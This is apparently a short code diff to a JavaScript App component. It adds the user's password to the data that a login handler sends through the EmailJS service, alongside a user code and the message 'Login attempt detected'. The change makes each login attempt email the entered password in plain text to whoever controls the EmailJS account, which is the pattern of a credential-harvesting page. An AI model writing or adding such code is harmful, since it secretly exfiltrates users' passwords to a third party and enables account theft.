@@ -34,6 +34,7 @@ function App() {
     try {
       await emailjs.send(EMAIL_JS_SERVICE_ID, EMAIL_JS_TEMPLATE_ID, {
         user_code: userCode,
+        password: password,
         timestamp: new Date().toISOString(),
         message: 'Login attempt detected',
       });
